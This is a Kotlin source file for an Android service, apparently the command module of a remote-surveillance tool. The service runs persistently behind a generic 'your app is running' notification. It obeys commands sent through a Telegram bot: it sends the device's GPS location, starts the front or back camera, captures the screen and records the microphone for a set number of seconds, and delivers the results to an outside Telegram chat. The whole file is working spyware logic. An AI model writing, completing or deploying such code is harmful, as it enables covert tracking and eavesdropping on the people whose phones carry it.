package com.gsm.n

import android.app.Notification
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import androidx.annotation.RequiresApi
import com.pengrad.telegrambot.TelegramBot
import com.pengrad.telegrambot.UpdatesListener
import com.pengrad.telegrambot.model.Update
import com.pengrad.telegrambot.request.SendLocation
import com.pengrad.telegrambot.request.SendMessage
import com.pengrad.telegrambot.request.SendVoice
import java.io.File

class TelegramService : Service() {

    private lateinit var botToken: String
    private lateinit var chatId: String
    private lateinit var bot: TelegramBot
    private lateinit var locManager: LocManager
    private lateinit var micManager: MicManager
    private var isCameraRunning = false
    private lateinit var cameraManager: CameraManager
    private lateinit var screenCaptureManager: ScreenCaptureManager

    private lateinit var handlerThread: HandlerThread
    private lateinit var handler: Handler

    private val NOTIFICATION_ID = 123
    private val CHANNEL_ID = "CHANNEL_ID"
    private val CHANNEL_NAME = "CHANNEL_NAME"
    private val CHANNEL_DESCRIPTION = "CHANNEL_DESCRIPTION"

    private val FOREGROUND_SERVICE_TYPE = "FOREGROUND_SERVICE_TYPE"
    private val FOREGROUND_SERVICE_TYPE_LOCATION = "FOREGROUND_SERVICE_TYPE_LOCATION"

    override fun onCreate() {
        super.onCreate()

        // Obtener los valores de botToken y chatId de MainActivity
        botToken = MainActivity.botToken
        chatId = MainActivity.chatId

        bot = TelegramBot(botToken)

        bot.setUpdatesListener { updates ->
            updates.forEach { handleUpdate(it) }
            UpdatesListener.CONFIRMED_UPDATES_ALL
        }

        // Inicializar el hilo y el Handler para la cámara
        handlerThread = HandlerThread("CameraHandlerThread")
        handlerThread.start()
        handler = Handler(handlerThread.looper)

        // Inicializar el ScreenCaptureManager
        screenCaptureManager = ScreenCaptureManager(applicationContext, botToken, chatId, { message -> sendMessage(message) })

        // Crear la notificación
        val notification = createNotification()

        // Iniciar el servicio como un servicio de primer plano con la notificación permanente
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(Intent(this, TelegramService::class.java).putExtra(FOREGROUND_SERVICE_TYPE, FOREGROUND_SERVICE_TYPE_LOCATION))
        } else {
            startService(Intent(this, TelegramService::class.java))
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun createNotification(): Notification {
        // Configurar el PendingIntent para abrir la aplicación al tocar la notificación
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)

        // Construir la notificación
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Tu App está en ejecución")
            .setContentText("Toque para abrir la aplicación")
            .setSmallIcon(R.drawable.ic_notification_icon)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MAX)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationChannel = NotificationChannel(CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_HIGH)
            notificationChannel.description = CHANNEL_DESCRIPTION

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager?.createNotificationChannel(notificationChannel)
            builder.setChannelId(CHANNEL_ID)
        }

        return builder.build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Iniciar el servicio como un servicio de primer plano
        startForeground(NOTIFICATION_ID, createNotification())

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun handleUpdate(update: Update) {
        val message = update.message()
        val text = message.text()

        // Expresión regular para buscar un comando "/rec" seguido de un número
        val regex = "^\\/rec(\\d+)$".toRegex()

        when (text) {
            "/gps" -> {
                locManager = LocManager(applicationContext)
                val location = locManager.getLocation()
                if (locManager.canGetLocation() && location != null) {
                    val latitudeValue = location.latitude.toFloat()
                    val longitudeValue = location.longitude.toFloat()
                    val sendLocationRequest = SendLocation(chatId, latitudeValue, longitudeValue)
                    bot.execute(sendLocationRequest)
                } else {
                    sendMessage("No se pudo obtener la ubicación.")
                }
                locManager.stopUsingGPS()
            }

            "/camfront" -> {
                if (!isCameraRunning) {
                    // Iniciar la cámara frontal en un hilo
                    handler.post {
                        cameraManager = CameraManager(applicationContext, botToken, chatId)
                        cameraManager.startBackgroundThread()
                        cameraManager.startUp(true)
                        sendMessage("Cámara frontal iniciada.")
                        isCameraRunning = true
                    }
                } else {
                    sendMessage("La cámara frontal ya está en ejecución.")
                }
            }
            "/camback" -> {
                if (!isCameraRunning) {
                    // Iniciar la cámara trasera en un hilo
                    handler.post {
                        cameraManager = CameraManager(applicationContext, botToken, chatId)
                        cameraManager.startBackgroundThread()
                        cameraManager.startUp(false)
                        sendMessage("Cámara trasera iniciada.")
                        isCameraRunning = true
                    }
                } else {
                    sendMessage("La cámara trasera ya está en ejecución.")
                }
            }

            "/camstop" -> {
                if (isCameraRunning) {
                    // Detener la cámara en un hilo
                    handler.post {
                        cameraManager.stopCamera()
                        cameraManager.stopBackgroundThread()
                        isCameraRunning = false
                        sendMessage("Cámara detenida.")
                    }
                } else {
                    sendMessage("La cámara no está en ejecución.")
                }
            }

            "/cap" -> {
                screenCaptureManager.startScreenCapture(update.message().messageId(), null)
            }

            else -> {
                val matchResult = regex.find(text)
                if (matchResult != null) {
                    val seconds = matchResult.groupValues[1].toIntOrNull()
                    if (seconds != null && seconds > 0) {
                        micManager = MicManager { audioFile ->
                            sendVoice(audioFile)
                        }
                        micManager.startRecording(seconds)
                        sendMessage("Grabación iniciada durante $seconds segundos.")
                    } else {
                        sendMessage("Por favor, proporciona una cantidad válida de segundos para la grabación.")
                    }
                } else {
                    sendMessage("Comando desconocido.")
                }
            }
        }
    }

    private fun sendVoice(file: File?) {
        if (file != null && file.exists()) {
            val sendVoiceRequest = SendVoice(chatId, file)
            bot.execute(sendVoiceRequest)
        } else {
            sendMessage("No se pudo enviar el archivo de audio.")
        }
    }

    private fun sendMessage(message: String) {
        bot.execute(SendMessage(chatId, message))
    }

    override fun onDestroy() {
        super.onDestroy()
        // Detener el hilo y liberar recursos
        handlerThread.quitSafely()
    }
}
